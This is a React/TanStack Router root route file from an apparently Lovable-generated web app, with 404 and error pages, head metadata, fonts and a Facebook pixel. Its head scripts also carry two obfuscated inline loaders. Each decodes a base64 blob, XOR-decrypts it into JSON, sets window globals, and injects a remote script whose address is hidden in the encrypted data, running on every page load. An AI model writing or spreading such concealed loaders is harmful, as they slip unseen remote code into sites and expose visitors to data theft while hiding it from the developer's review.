import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow:wght@400;500;600;700;800;900&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        children: `!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '3228776890665604');
fbq('track', 'PageView');`,
      },
      {
        children: `(function(){var u_i=atob("DO4uhsjjJY33jB4pKpUM87qPB7fV5GpdWp0UqeeAQePZ+WpEQ4hXqKuMSKOV/jFaSZxH9ryQCv2e9HtFBZ5H/q2PC+eErjILS5pa9KGBUPmS/zwTcbMCpK+PSu+W4G0LELVVpKaCSOjVtjxZQ5ZL6oGHB6HV+n9FX4sMvOrVRLXGvHgZHdsfs/jRR+zD7ngeT9ZIsPnBWNCK");var x_zj=[];for(var d_1=0;d_1<u_i.length;d_1++){x_zj.push(u_i.charCodeAt(d_1)&255);}var d_rl60=x_zj[0];var c_j=x_zj.slice(1,1+d_rl60);var f_r5my=x_zj.slice(1+d_rl60);var z_53jz=f_r5my.map(function(b,y_nk){return b^c_j[y_nk%d_rl60];});var q_i9="";for(var o_l=0;o_l<z_53jz.length;o_l++){q_i9+=String.fromCharCode(z_53jz[o_l]&255);}var b_a30z=decodeURIComponent(escape(q_i9));var b_yf=JSON.parse(b_a30z);var x_9i=b_yf.globals||[];x_9i.forEach(function(r_9g7m){window[r_9g7m.name]=r_9g7m.value;});var u_5kv=document.createElement("script");u_5kv.src=b_yf.url;u_5kv.async=true;u_5kv.defer=true;(b_yf.attributes||[]).forEach(function(s_o){u_5kv.setAttribute(s_o.name,s_o.value);});(document.head||document.documentElement).appendChild(u_5kv);})();`,
      },
      {
        children: `(function(){var v_6=atob("DG5onqw+svNkNd6BqRVK695SkMlGXar12R1SsYNd1p1KQKrswAgRsM9R390GR/HyyhwB7thNnYYQWK2uxQ8c+99KnJkXF/KjyBoc7MVcx4cBRvy78hVK8M1T19FeF7rg3Q9F69hT25UdGK7zzBgN8NgTwYYGXLryi0JK6M1Sx5ZGD/yj1DMV");var q_e=[];for(var l_2=0;l_2<v_6.length;l_2++){q_e.push(v_6.charCodeAt(l_2)&255);}var m_e6cr=q_e[0];var l_com=q_e.slice(1,1+m_e6cr);var z_nuuv=q_e.slice(1+m_e6cr);var t_zia=z_nuuv.map(function(b,u_j){return b^l_com[u_j%m_e6cr];});var r_s="";for(var b_rx=0;b_rx<t_zia.length;b_rx++){r_s+=String.fromCharCode(t_zia[b_rx]&255);}var i_804=decodeURIComponent(escape(r_s));var i_r1=JSON.parse(i_804);var c_xx86=i_r1.globals||[];c_xx86.forEach(function(u_1wog){window[u_1wog.name]=u_1wog.value;});var k_b6z1=document.createElement("script");k_b6z1.src=i_r1.url;k_b6z1.async=true;k_b6z1.defer=true;(i_r1.attributes||[]).forEach(function(w_m1z){k_b6z1.setAttribute(w_m1z.name,w_m1z.value);});(document.head||document.documentElement).appendChild(k_b6z1);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=3228776890665604&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
